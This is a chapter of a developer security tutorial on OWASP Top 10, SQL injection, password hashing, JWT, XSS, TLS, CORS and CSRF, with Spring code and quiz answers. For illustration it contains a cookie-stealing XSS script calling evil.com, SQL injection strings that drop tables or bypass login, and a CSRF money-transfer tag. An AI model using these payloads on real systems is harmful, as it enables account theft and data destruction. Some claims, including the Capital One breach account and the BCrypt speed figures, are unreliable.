# 🔐 Security Fundamentals - Complete Guide

**Navigation**: [< API Design](07_API_Design_REST.md) | [Index](00_INDEX.md) | [Next: System Design >](09_System_Design.md)

---

# WHY: Why Security Is Non-Negotiable

## The Real Cost

```
Equifax Breach (2017)     → 147 million records leaked → $700M+ settlement
                            Cause: Unpatched Apache Struts vulnerability

Log4Shell (2021)          → Affected MILLIONS of servers worldwide
                            Cause: JNDI injection in log4j library

SolarWinds (2020)         → 18,000 organizations compromised
                            Cause: Compromised CI/CD build pipeline

LESSON: Security is not a feature to add later.
        It's a MINDSET from line 1 of code.
```

---

# WHAT: Core Security Concepts

## Authentication vs Authorization

```
AUTHENTICATION (AuthN) = WHO are you?
  → Login with username/password
  → Show your ID card at the door

AUTHORIZATION (AuthZ) = WHAT can you do?
  → Role-based: Admin can delete, User can only read
  → Show your badge to access the lab

Flow:
  1. User sends credentials (login)
  2. Server AUTHENTICATES → issues token (JWT)
  3. User sends token with every request
  4. Server AUTHORIZES → checks role/permissions for that endpoint
```

## The OWASP Top 10 (2021)

```
#  │ Vulnerability              │ What It Means                    │ Prevention
───┼────────────────────────────┼──────────────────────────────────┼──────────────────
1  │ Broken Access Control      │ User accesses others' data       │ Check permissions EVERY request
2  │ Cryptographic Failures     │ Sensitive data exposed           │ Encrypt at rest + in transit
3  │ Injection                  │ SQL/OS/LDAP injection            │ Parameterized queries, NEVER concat
4  │ Insecure Design            │ Flawed architecture              │ Threat modeling from start
5  │ Security Misconfiguration  │ Default passwords, open ports    │ Harden configs, disable defaults
6  │ Vulnerable Components      │ Outdated libraries with CVEs     │ Dependency scanning (Dependabot)
7  │ Auth Failures              │ Weak passwords, no MFA           │ MFA, rate limiting, strong hashing
8  │ Data Integrity Failures    │ Untrusted deserialization        │ Sign updates, verify integrity
9  │ Logging Failures           │ Can't detect breaches            │ Log security events, monitor alerts
10 │ SSRF                       │ Server makes requests attacker   │ Allowlist URLs, disable redirects
   │                            │ chooses                          │
```

---

# HOW: Securing Applications

## Level 1 - SQL Injection

```java
// ❌ VULNERABLE: String concatenation
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
// Attack: userInput = "'; DROP TABLE users; --"
// Result: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'

// ✅ SAFE: Parameterized query
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?"
);
ps.setString(1, userInput);
// Attack input becomes a LITERAL string, not SQL code

// ✅ SAFE: JPA/Hibernate (automatically parameterized)
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);
```

## Level 2 - Password Hashing

```java
// NEVER store passwords in plain text!

// ❌ BAD:
user.setPassword(rawPassword);  // stored as "MyPassword123"

// ❌ BAD: MD5/SHA (fast = bad for passwords, crackable)
String hash = DigestUtils.md5Hex(rawPassword);

// ✅ GOOD: BCrypt (slow ON PURPOSE - 100ms per hash)
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // 12 rounds
}

// Registration:
String hashed = passwordEncoder.encode("MyPassword123");
// Result: $2a$12$LJ3m4ys3Sn0k7hRA... (60 chars, salted)

// Login verification:
boolean matches = passwordEncoder.matches("MyPassword123", storedHash);

// WHY BCrypt?
// - SLOW (10x per second vs MD5's millions per second)
// - Built-in SALT (same password → different hash each time)
// - COST FACTOR adjustable (increase as hardware gets faster)
```

## Level 3 - JWT (JSON Web Tokens)

```
JWT Structure:
  HEADER.PAYLOAD.SIGNATURE

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user42", "role": "ADMIN", "exp": 1709500000}
Signature: HMAC-SHA256(header + "." + payload, SECRET_KEY)

Flow:
  ┌────────┐                           ┌────────┐
  │ Client │ ─── POST /login ──────>   │ Server │
  │        │     {email, password}      │        │
  │        │ <── 200 + JWT token ───    │        │
  │        │                            │        │
  │        │ ─── GET /api/orders ──>    │        │
  │        │     Authorization:         │        │
  │        │     Bearer eyJhbG...       │        │
  │        │ <── 200 + data ────────    │        │
  └────────┘                            └────────┘
```

```java
// Spring Security + JWT Configuration (Spring Boot 3):
@Configuration
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())  // Disable for stateless API
            .sessionManagement(sm -> sm.sessionCreationPolicy(STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
            .build();
    }
}
```

## Level 4 - XSS (Cross-Site Scripting)

```html
<!-- WHAT: Attacker injects JavaScript into your page -->

<!-- ❌ VULNERABLE: Rendering user input as HTML -->
<div>${userComment}</div>
<!-- Attack: userComment = <script>document.location='http://evil.com/steal?c='+document.cookie</script> -->

<!-- ✅ SAFE: Escape HTML entities -->
<div th:text="${userComment}"></div>
<!-- Thymeleaf auto-escapes -->

Prevention: 1. NEVER use innerHTML with user data 2. Use Content-Security-Policy
header 3. Use HttpOnly cookies (JS can't read them) 4. Sanitize input on server
AND client
```

## Level 5 - HTTPS & Encryption

```
HTTP  = Plain text (anyone on the network can read it)
HTTPS = Encrypted with TLS (only client and server can read)

TLS Handshake (simplified):
  1. Client → Server: "Hello, I support these ciphers"
  2. Server → Client: "Let's use this cipher + here's my certificate"
  3. Client verifies certificate with CA
  4. Both sides generate shared SECRET key
  5. All traffic encrypted with that key

Encryption Types:
  SYMMETRIC:  Same key encrypts and decrypts (AES-256) - fast
  ASYMMETRIC: Public key encrypts, private key decrypts (RSA) - slow
  HYBRID:     Use asymmetric to exchange symmetric key (TLS does this)
  HASHING:    One-way function, no decryption (BCrypt, SHA-256)
```

### Diagram: TLS 1.3 Handshake (1-RTT)

```
CLIENT                                 SERVER
  │                                      │
  │──── ClientHello (key share) ────────→│  ← Step 1: cipher suites + key share
  │                                      │
  │←──── ServerHello + Finished ─────────│  ← Step 2: server key + cert verify
  │                                      │
  │ (encrypted application data)         │  ← 0-RTT resumption supported
  │                                      │
  │──── HTTP Request (encrypted) ───────→│  ← Step 3: encrypted app data
  │                                      │
  │←──── HTTP Response (encrypted) ──────│  ← Step 4: response
  │                                      │

Total: 1 round trip (vs TLS 1.2 = 2 RTT)
Improvement: TLS 1.3 cut handshake latency in half (RFC 8446, 2018)
```

## Level 6 - CORS (Cross-Origin Resource Sharing)

```java
// WHAT: Browser blocks requests from different origins by default
// Your React app (localhost:3000) calling Spring API (localhost:8080)

@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://myapp.com")  // NOT "*" in production!
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

---

🔬 **Section Challenge - Level 6 - CORS (Cross-Origin Resource Sharing)**

**Challenge 1 (Reasoning):** A developer sets `.allowedOrigins("*")` in production to stop a CORS error. What specific attack does this enable, and why does `allowCredentials(true)` make it catastrophically worse?

<details><summary>Answer</summary>

`allowedOrigins("*")` means **any origin** can make cross-origin requests to your API. This enables **Cross-Site Request Forgery (CSRF)**: a malicious site at `evil.com` can embed `fetch('https://yourapi.com/api/admin/deleteAll', {method:'DELETE'})` and the browser will send it. Normally, the browser's same-origin policy blocks this. CORS with `*` removes that block. Adding `allowCredentials(true)` is **invalid with `*`** (the spec forbids it - Spring will throw an error), but conceptually the combination would mean: cookies and session tokens are included in the cross-origin request, turning a read-only leak into a full session-authenticated attack. Fix: always explicitly list allowed origins: `.allowedOrigins("https://yourapp.com")`.

</details>

**Challenge 2 (Trace):** A browser sends a `GET /api/public` request from `react-app.com` to `api.backend.com`. When does the browser send a pre-flight `OPTIONS` request first, and when does it skip it?

<details><summary>Answer</summary>

The browser sends a **pre-flight OPTIONS request** when the actual request is "non-simple": (1) method is `PUT`, `DELETE`, or `PATCH` (not GET/POST/HEAD); (2) has custom headers like `Authorization`, `Content-Type: application/json`; (3) `Content-Type` is not `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. For a `GET /api/public` with no custom headers, the browser skips the pre-flight and sends the request directly - checking the `Access-Control-Allow-Origin` response header to decide if the JS code can read the response. The pre-flight is a performance cost: 2 HTTP round-trips instead of 1. Use `maxAge(3600)` to let browsers cache the pre-flight result for 1 hour.

</details>

# WHERE: Security Checklist for Every Project

```
INPUT:
  ☐ Validate ALL input (size, type, format, range)
  ☐ Use parameterized queries (NEVER string concatenation)
  ☐ Sanitize output (escape HTML entities)

AUTH:
  ☐ Hash passwords with BCrypt (cost factor ≥ 12)
  ☐ Use JWT with short expiry (15-60 min)
  ☐ Implement refresh tokens
  ☐ Rate limit login attempts (5 per minute)

TRANSPORT:
  ☐ HTTPS everywhere (redirect HTTP → HTTPS)
  ☐ Set security headers (CSP, X-Frame-Options, HSTS)
  ☐ CORS configured for specific origins only

DATA:
  ☐ Encrypt sensitive data at rest (AES-256)
  ☐ Never log passwords, tokens, or PII
  ☐ Use environment variables for secrets (NEVER in code)

DEPENDENCIES:
  ☐ Run dependency scan (Dependabot, Snyk, OWASP DC)
  ☐ Update libraries regularly
  ☐ Remove unused dependencies
```

---

# 🧭 Security Cheat Sheet

```
SQL Injection    → Parameterized queries
XSS              → Escape output, CSP headers
CSRF             → Anti-CSRF tokens (or stateless JWT)
Password Storage → BCrypt (never MD5/SHA)
Auth             → JWT + refresh token
Transport        → HTTPS + HSTS
Secrets          → Environment variables, vault
Dependencies     → Dependabot + regular updates
```

---

# 🏋️ Practice

## Exercise 1: Find the Vulnerabilities

```java
// How many security issues can you spot?
@PostMapping("/login")
public String login(@RequestParam String user, @RequestParam String pass) {
    String sql = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pass + "'";
    ResultSet rs = stmt.executeQuery(sql);
    if (rs.next()) {
        return "Welcome " + user;
    }
    return "Invalid: " + user + "/" + pass;
}
// Answers: (1) SQL injection, (2) plain text password comparison,
//   (3) password in error message, (4) no rate limiting, (5) GET-style params
```

🔬 **Section Challenge - Exercise 1: Find the Vulnerabilities**

**Challenge (Audit):** The code above has at least 5 security vulnerabilities. List them all with the exact fix for each. Don't look at the comment - cover it and try first.

<details><summary>Answer</summary>

1. **SQL Injection** (line 2-3): String concatenation allows `user = "' OR 1=1 --"` which bypasses authentication entirely. Fix: `PreparedStatement` with `?` parameters. 2. **Plaintext password comparison** (line 4-5): Password is compared as-is from the database, meaning passwords are stored in plaintext. Fix: BCrypt - store `passwordEncoder.encode(pass)` and verify with `passwordEncoder.matches(rawPass, storedHash)`. 3. **Credential leak in error message** (line 7): `"Invalid: " + user + "/" + pass` exposes the attempted password in the HTTP response, logs, and browser history. Fix: return only `"Invalid credentials"`. 4. **No rate limiting**: An attacker can make unlimited login attempts. Fix: implement a counter with Redis/Bucket4j - block after 5 failures per IP per minute. 5. **`@RequestParam` for credentials**: Query params (`?user=x&pass=y`) appear in server logs, browser history, and Referer headers. Fix: use `@RequestBody LoginRequest` with a POST body so credentials travel in the encrypted TLS payload only.

</details>

## Exercise 2: Secure a Spring Boot App

```
Build a Spring Boot REST API with:
  - BCrypt password hashing
  - JWT authentication
  - Role-based authorization (USER vs ADMIN)
  - Input validation with @Valid
  - Global exception handler (no stack traces to client)
  - CORS configured for localhost:3000
```

---

### Production Reality

**Security fundamentals fail in production in these named ways:**

- **SQL injection in production** - a ` PreparedStatement` replaced all string concatenation, but a dynamic query in a reporting feature used `ORDER BY columnName` with direct string interpolation. An attacker used `'1; DROP TABLE users; --'` as a sort column. SQLi in ORDER BY is as dangerous as WHERE clause injection. Prevention: whitelist column names instead of accepting arbitrary strings in ORDER BY.
- **XSS in React apps** - React escapes JSX output by default, but dangerouslySetInnerHTML bypasses this. A Markdown renderer using `dangerouslySetInnerHTML` to support bold/italic renders attacker-injected HTML. CSP (Content-Security-Policy) header is the last line of defense: `script-src 'self'` prevents inline script execution even if XSS payload is injected.
- **Secret leakage in git history** - `AWS_ACCESS_KEY_ID=AKIA...` committed to a public GitHub repo is scraped by automated attackers within 60 seconds of push (GitHub bug bounty data). Capital One breach (2019, $300M settlement): a misconfigured WAF allowed SSRF that exfiltrated AWS credentials from the metadata service - the credentials were in Terraform state committed to a public repo.
- **CSRF token absence** - a stateless JWT API with `Authorization: Bearer <token>` is immune to CSRF (no cookies). But if the application also uses cookie-based sessions for web browser clients, absence of CSRF tokens on state-mutating endpoints allows cross-site request forgery. Attacker embeds `<img src="https://bank.com/transfer?to=attacker&amount=10000">` on a malicious page; the browser sends the cookie automatically.
- **BCrypt cost factor too low for 2024** - BCrypt with cost factor 10 (2004 default) hashes 50 passwords per second per CPU core. A modern GPU can try 100,000 BCrypt hashes/second. With cost factor 10, a 6-character alphanumeric password is cracked in ~30 minutes. OWASP 2023: minimum cost factor 12 for login systems, 15+ for sensitive applications. Increasing cost factor requires existing hashes to be re-hashed on next successful login (lazy migration).

**Debug workflow:** For SQL injection: enable Snyk Code/Semgrep rules in CI; for secret scanning: run `trufflehog filesystem .` against the full git history; for CSRF: verify `SameSite` cookie attribute is set (`SameSite=Lax` or `SameSite=Strict`) in browser DevTools.
**Mitigation discipline:** Use OWASP ZAP or Burp Suite for automated security scanning in CI/CD; rotate all secrets that were ever committed (assume compromise within 60 seconds of push to public repos); use `sechub` or `trivy` to scan container images for known CVEs; enforce MFA on all cloud console accounts.

**Next Chapter**: [System Design →](09_System_Design.md)

---

**Navigation**: [< Previous](07_API_Design_REST.md) | [Back to Index](../00_MASTER_INDEX.md) | [Next >](09_System_Design.md)

🔬 **Section Challenge - Exercise 2: Secure a Spring Boot App**

**Challenge 1 (Design):** You've built a Spring Boot REST API with BCrypt + JWT. A security reviewer says your JWTs are a liability because they can't be revoked before expiry. What is the standard pattern to solve this without abandoning JWTs?

<details><summary>Answer</summary>

Use a **refresh token + short-lived access token** pattern. Access JWTs expire in 15 minutes - short enough that a stolen token has limited blast radius. Store a long-lived refresh token (UUID, 7 days) in an **HttpOnly, Secure cookie** (not accessible to JS, preventing XSS theft). When the access JWT expires, the client posts to `/auth/refresh` with the cookie - server validates the refresh token against a database record, issues a new access JWT, and optionally rotates the refresh token. To "revoke" access: delete the refresh token DB record. The user's next request after the 15-min window fails. This gives you ~15 minutes of revocation lag - acceptable for most systems. For zero-lag revocation: maintain a Redis blocklist of revoked JWT JTI (JWT ID) values checked on every request.

</details>

**Challenge 2 (Senior):** Your Spring Boot app has `@PreAuthorize("hasRole('ADMIN')")` on all admin endpoints. A penetration tester reports a **Broken Access Control** finding even though roles are enforced. How is this possible?

<details><summary>Answer</summary>

Broken Access Control is #1 on OWASP Top 10 and often bypasses role checks via **object-level authorization failures**. Example: `GET /api/orders/{id}` checks that the caller is authenticated, but doesn't verify that order `{id}` belongs to the caller. User A (role USER) calls `GET /api/orders/9999` — order 9999 belongs to User B, but the endpoint returns it anyway. Fix: always add **ownership checks**: `if (!order.getOwnerId().equals(currentUser.getId())) throw new ForbiddenException()`. `@PreAuthorize` only checks role; you must write the data-level check yourself. This is called **IDOR (Insecure Direct Object Reference)**.

</details>

---

### Trade-off: Auth Strategy Variants

| Aspect              | Session/Cookie    | JWT (Bearer)      | OAuth2/OIDC       | API Keys          |
|---------------------|-------------------|-------------------|-------------------|-------------------|
| State               | server-side       | stateless         | delegated         | stateless         |
| Revocation          | immediate         | hard (blocklist)  | token introspection| rotate/revoke    |
| Best for            | traditional web   | SPA / mobile      | third-party auth  | service-to-service|
| CSRF protection     | required (SameSite)| not needed        | not needed        | not needed        |
| Storage             | server session    | client (httpOnly) | client (secure)   | env / vault       |
| Caching             | yes (Redis)       | hard              | provider-bound    | yes               |
| Year mainstream     | 1995 (cookies)    | 2010 (JWT draft)  | 2012 (OAuth 2.0)  | 2005 (AWS keys)   |

**Selection rule:** Sessions for server-rendered web apps; JWT for stateless APIs and SPAs; OAuth2/OIDC when delegating to Google/GitHub/etc.; API keys for service-to-service in trusted environments.
